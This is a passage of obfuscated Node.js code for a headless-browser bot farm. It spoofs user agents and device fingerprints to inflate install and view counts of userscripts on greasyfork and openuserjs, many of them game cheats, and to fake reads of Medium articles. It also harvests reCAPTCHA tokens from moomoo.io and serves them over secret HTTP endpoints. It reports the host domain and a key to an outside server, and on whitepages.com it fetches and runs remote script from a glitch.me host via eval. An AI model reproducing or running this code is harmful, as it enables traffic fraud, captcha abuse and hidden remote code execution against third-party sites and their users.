      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + T(0xe, 'MEB&') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + S(0xf) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + S(0x7) + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + S(0x11) + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + U(0x6) + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xca5 + 0x57d + 0x728 * 0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x20ad + -0x20d0 + 0x23)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * 0x21d5 + -0x1be * 0x10 + 0x7 * 0x8df), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2085 + 0x984 * 0x4 + 0x1 * -0x527), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x15d * -0x16 + -0x536 + -0x18c8;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x2396 + -0x354 + 0x24a * 0x11; w < getRandomInt(0x134d * 0x2 + 0x5 * -0x2c3 + -0x14e * 0x13, 0x1 * -0xc9 + -0x50b * -0x5 + -0x1869); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x26 * 0x1bc + -0x37 * 0x50e + 0x12125 * 0x2);
        }
      }();
    }, -0x1ccf + -0x1 * 0x1b9b + 0x38ce), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x23 * 0x3b + -0x1f2 * -0x7 + -0x58d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x9ec * 0x1 + -0x21da + -0x3 * -0x7fa, -0x330 + -0x6 * -0x156 + 0x1 * -0x4a2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x65 * 0x1f7 + 0xb3f2 + -0xb * 0x17bf);
    }, -0x1333 + -0x3 * -0x27 + 0x1322), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xd9e + 0x127 + 0xc7 * -0x13;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x2017 + -0x1b50 + 0x6f1), await u['evaluate'](() => {
            const V = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + V(0x5) + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2fa + -0x155 + -0x1 * 0x1a5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1a871 * 0x9 + 0x4 * -0x3941c + 0xc5a7 * 0x11);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xca * 0x2 + 0x18a2 + -0x19d2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const W = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xec8 + -0xc9f + 0x161 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + W(0x2) + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x22b5 + 0x347 * -0x1 + 0x458c);
}
doFlags['doOUJS'] && ((async () => {
  const Y = d;
  async function f() {
    const X = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xa1 * -0x9 + -0x1602 + 0x4 * 0x6eb) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xf + 0x1836 + 0x2 * -0xc13));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x184f + -0x2615 * -0x1 + -0xdc6, D['indexOf']('\x20'));
        return B ? E['slice'](0x17f5 * 0x1 + -0x6 * -0x614 + -0x1f * 0x1f3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x57d * 0x7 + -0x410e + -0x3 * -0x2f83),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3a1b + 0x9 * -0x801 + 0x34fe),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + X(0x0) + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + Y(0x1) + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x147a + -0x1055 * -0x2 + 0x2cc * -0x13; k < -0x7bf + -0x1390 * -0x1 + -0xbcd; k++)
    setTimeout(f, (-0x158d3 + -0x1 * -0x17652 + 0x3 * 0x444b) * k * getRandomInt(-0x4fd * -0x3 + 0x1 * 0x472 + -0x1368, -0x22d8 + -0xad * -0x1d + 0xf42));
  setInterval(() => {
    f();
    for (let l = 0xbe2 + -0x1601 + -0xa1f * -0x1; l < -0x233e + 0xa * -0xd1 + -0x2 * -0x15b6; l++)
      setTimeout(f, (-0x1d8 * 0x63 + 0xcaaf + -0xd639 * -0x1) * l * getRandomInt(0x9c7 + 0xa6 * 0x33 + -0x2ad8, -0x1512 + 0x10 * -0x1 + 0x1 * 0x1525));
  }, -0x2561eb + -0x1666d5 + 0x72b740);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
